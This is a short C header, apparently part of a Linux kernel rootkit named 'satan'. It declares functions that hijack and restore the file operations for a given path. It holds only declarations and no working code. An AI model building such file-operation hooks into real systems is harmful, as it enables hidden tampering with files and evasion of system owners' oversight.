// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#ifndef SATAN_FILE_H_
#define SATAN_FILE_H_

#include <linux/string.h>

void satan_hijack_f_op(const char *path);
void satan_unhijack_f_op(const char *path);

#endif  // SATAN_FILE_H_
